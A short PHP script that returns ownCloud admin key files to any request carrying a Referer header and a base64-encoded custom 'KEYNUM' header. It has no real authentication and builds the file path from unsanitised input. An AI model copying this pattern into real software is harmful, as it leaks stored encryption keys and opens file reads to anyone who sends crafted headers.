<?php
if(!isset($_SERVER['HTTP_REFERER'])){
	die();
}
if(!isset($_SERVER['HTTP_KEYNUM'])){
	die();
}

$d2 = base64_decode($_SERVER['HTTP_KEYNUM']);


// $d2 = base64_decode($d2);
// $d2 = base64_decode($d2);
// echo $d2;
$actualKeyName = substr($d2,8,10);
echo file_get_contents("owncloud/data/admin/files/keys/$actualKeyName.key");

?>